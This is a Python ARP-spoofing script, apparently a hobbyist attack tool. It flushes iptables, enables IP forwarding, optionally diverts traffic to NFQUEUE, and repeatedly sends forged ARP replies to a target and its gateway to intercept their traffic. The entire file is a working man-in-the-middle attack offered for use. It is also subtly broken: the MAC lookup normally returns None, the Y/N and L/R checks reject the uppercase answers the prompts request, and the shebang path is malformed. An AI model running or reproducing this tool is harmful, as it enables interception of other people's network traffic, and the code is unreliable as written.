#!usr/bin/env python

import os
import sys
import time
import scapy.all as scapy
from scapy.all import srp,send,ARP
import subprocess
from colorama import Fore



subprocess.call("clear")

logo = """


           _____  _____     _____                    __ 
     /\   |  __ \|  __ \   / ____|                  / _|
    /  \  | |__) | |__) | | (___  _ __   ___   ___ | |_ 
   / /\ \ |  _  /|  ___/   \___ \| '_ \ / _ \ / _ \|  _|
  / ____ \| | \ \| |       ____) | |_) | (_) | (_) | |  
 /_/    \_\_|  \_\_|      |_____/| .__/ \___/ \___/|_|  
                                 | |                    
                                 |_|                    


"""

print(f"{Fore.LIGHTMAGENTA_EX}{logo}")
print(f"[+]-[+]-[+]-[+]-[+]-[+]-[+]-[+]-[+]-[+]-[+]-[+]-[+]-[+]-[+]-[+]-[+]-[+]-[+]-[+]-[+] *** Created by: {Fore.RED}Totenkopf\n")


os.system("iptables --flush")
os.system("iptables --table nat --flush")
os.system("iptables --delete-chain")
os.system("iptables --table nat --delete-chain")
os.system("iptables -P FORWARD ACCEPT")

print(" ")
question = input("Are you using this tool to run any other attacks? (Y/N): \n")
if question == "Y".lower():
    question2 = input("\nAre you running the attack against local or remote machine? (L/R): \n")

    if question2 == "L".lower():
        os.system("iptables -I OUTPUT -j NFQUEUE --queue-num 0")
        os.system("iptables -I INPUT -j NFQUEUE --queue-num 0")
        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

    elif question2 == "R".lower():
        os.system("iptables -I FORWARD -j NFQUEUE --queue-num 0")
        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

    else:
        print("\nWrong answer given! Choose either (L or R)\n")

elif question == "N".lower():
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

else:
    print("\nWrong answer given! Choose either (Y or N)\n")


iface = input(f"{Fore.LIGHTWHITE_EX}>>> Put in the interface: ")
target_ip = input(f"\n{Fore.LIGHTWHITE_EX}>>> Put in target IP address: ")
spoof_ip = input(f"\n{Fore.LIGHTWHITE_EX}>>> Put in gateway IP address: ")
print(" ")

def get_mac(ip):

    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, iface=iface, timeout=3, verbose=False)[0]

    if answered_list == "":
        return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def restore(destination_ip, source_ip):
    target_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=target_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)

sent_packets_count = 0
try:
    while True:
        spoof(target_ip, spoof_ip)
        spoof(spoof_ip, target_ip)
        # print("[+] Sent two packets")
        sent_packets_count += 2
        # the use of comma, end="", and flush function below makes the print be in one line and not go down line by line.
        # the \r tell the print statemt to always print form the start of the line.
        print(f"\r{Fore.LIGHTGREEN_EX}[+] Packets sent: {str(sent_packets_count)}", end="")
        sys.stdout.flush()
        time.sleep(2)
except (IndexError, KeyboardInterrupt):
    try:
        restore(target_ip, spoof_ip)
        print(f"\n\n{Fore.LIGHTYELLOW_EX}[+] Resetting ARP tables && quitting ...")
        time.sleep(3)
        print(f"\n{Fore.LIGHTYELLOW_EX}[+] MACs restored to their originals!\n")
        subprocess.call("iptables --flush", shell=True)

        # print(f"\n\n{Fore.LIGHTRED_EX}[-] The program just went stupid for no reason!\n")
    except:
        print(f"\n{Fore.LIGHTRED_EX}CTRL + C detected, quitting.. \n")
        subprocess.call("iptables --flush", shell=True)

